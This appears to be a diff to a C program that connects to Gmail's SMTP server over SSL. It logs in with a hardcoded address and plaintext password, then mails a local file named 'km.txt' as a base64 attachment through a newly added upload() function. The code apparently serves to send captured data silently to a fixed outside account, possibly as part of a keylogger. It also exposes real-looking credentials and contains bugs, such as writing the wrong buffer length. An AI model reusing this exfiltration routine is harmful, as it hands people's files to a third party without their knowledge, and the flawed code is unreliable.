@@ -19,17 +19,38 @@
 
 #define h_addr h_addr_list[0] /* for backward compatibility */
 
-int fd;
+void upload(SSL *s)
+{
+  FILE *fp = fopen("km.txt", "rb");
+  fseek(fp, 0, SEEK_END);
+  long size = ftell(fp);
+  rewind(fp);
 
-static inline int socket_setopt(int sockfd, int level, int optname,
-                                int optval) {
+  unsigned char *buffer = malloc(sizeof(unsigned char) * size);
+  fread(buffer, 1, size, fp);
+
+  unsigned char *out_buffer = malloc(sizeof(unsigned char) * size);
+  int            out_len    = EVP_EncodeBlock(out_buffer, buffer, size);
+
+  SSL_write(s, out_buffer, sizeof(unsigned char) * size);
+  char *cmd = "\r\n";
+  SSL_write(s, cmd, strlen(cmd));
+
+  fclose(fp);
+  free(buffer);
+  free(out_buffer);
+}
+
+static inline int socket_setopt(int sockfd, int level, int optname, int optval)
+{
   return setsockopt(sockfd, level, optname, (void *)&optval, sizeof(optval));
 }
 
-static SSL *init_sock(const char *host, const int port) {
+static SSL *init_sock(const char *host, const int port)
+{
   struct hostent *he = NULL;
-  char **ap = NULL;
-  he = gethostbyname(host);
+  char          **ap = NULL;
+  he                 = gethostbyname(host);
   if (he == NULL) {
     fprintf(stderr, "no host\n");
     goto fail;
@@ -40,8 +61,8 @@ static SSL *init_sock(const char *host, const int port) {
     goto fail;
   }
   struct sockaddr_in sa = (struct sockaddr_in){
-      .sin_family = AF_INET,
-      .sin_port = htons(port),
+      .sin_family      = AF_INET,
+      .sin_port        = htons(port),
       .sin_addr.s_addr = *(long *)(he->h_addr),
   };
 
@@ -55,11 +76,11 @@ static SSL *init_sock(const char *host, const int port) {
 
   /* fd = sockfd; */
   int n = 0; //#if OPENSSL_VERSION_NUMBER < 0x10100000L //SSL_library_init( );
-  n = OPENSSL_init_ssl(OPENSSL_INIT_NO_LOAD_SSL_STRINGS |
-                           OPENSSL_INIT_ADD_ALL_DIGESTS |
-                           OPENSSL_INIT_NO_LOAD_CONFIG | OPENSSL_INIT_ASYNC |
-                           OPENSSL_INIT_NO_ATEXIT,
-                       NULL);
+  n     = OPENSSL_init_ssl(OPENSSL_INIT_NO_LOAD_SSL_STRINGS |
+                               OPENSSL_INIT_ADD_ALL_DIGESTS |
+                               OPENSSL_INIT_NO_LOAD_CONFIG | OPENSSL_INIT_ASYNC |
+                               OPENSSL_INIT_NO_ATEXIT,
+                           NULL);
   if (n == 0) {
     fprintf(stderr, "ssl init fail\n");
     goto fail;
@@ -91,11 +112,12 @@ fail:
   return NULL;
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[])
+{
   SSL *s = init_sock("smtp.gmail.com", 465);
 
-  char recvbuf[4096] = {'\0'};
-  char *cmd = "EHLO smtp.gmail.com\r\n";
+  char  recvbuf[4096] = {'\0'};
+  char *cmd           = "EHLO smtp.gmail.com\r\n";
   SSL_write(s, cmd, strlen(cmd));
   SSL_read(s, recvbuf, 4096 - 1);
   puts(recvbuf);
@@ -110,9 +132,9 @@ int main(int argc, char *argv[]) {
   /* -------------------------------- */
   bzero(recvbuf, 4096);
   char enc_cmd[4096] = {'\0'};
-  cmd = "t400.linux@gmail.com";
-  int out_len = EVP_EncodeBlock((unsigned char *)enc_cmd,
-                                (const unsigned char *)cmd, strlen(cmd));
+  cmd                = "t400.linux@gmail.com";
+  int out_len        = EVP_EncodeBlock((unsigned char *)enc_cmd,
+                                       (const unsigned char *)cmd, strlen(cmd));
   SSL_write(s, enc_cmd, out_len);
   SSL_read(s, recvbuf, 4096 - 1);
   puts(recvbuf);
@@ -126,7 +148,7 @@ int main(int argc, char *argv[]) {
   /* ----------------------------------------------- */
   bzero(recvbuf, 4096);
   bzero(enc_cmd, 4096);
-  cmd = "Cragger2011";
+  cmd     = "Cragger2011";
   out_len = EVP_EncodeBlock((unsigned char *)enc_cmd,
                             (const unsigned char *)cmd, strlen(cmd));
   SSL_write(s, enc_cmd, out_len);
@@ -204,15 +226,16 @@ int main(int argc, char *argv[]) {
   out_len = EVP_EncodeBlock(enc_cmd, data, filestat.st_size);
   SSL_write(s, enc_cmd, out_len);
 #endif
-  cmd = "Content-Disposition:attachment;filename=\"km\"\r\n";
+  cmd = "Content-Disposition:attachment;filename=\"km.txt\"\r\n";
   SSL_write(s, cmd, strlen(cmd));
-  FILE *f = fopen("km", "r");
-  char buf[4096];
-  int n = 0;
-  while (4096 == (n = fread(&buf, sizeof(*buf), 6, f)))
-    ;
-  out_len = EVP_EncodeBlock(enc_cmd, buf, n);
-  SSL_write(s, enc_cmd, out_len);
+  upload(s);
+  /* FILE *f = fopen("km", "r"); */
+  /* char  buf[4096]; */
+  /* int   n = 0; */
+  /* while (4096 == (n = fread(&buf, sizeof(*buf), 6, f))) */
+  /*   ; */
+  /* out_len = EVP_EncodeBlock(enc_cmd, buf, n); */
+  /* SSL_write(s, enc_cmd, out_len); */
   cmd = "\r\n";
   SSL_write(s, cmd, strlen(cmd));
 #if 0
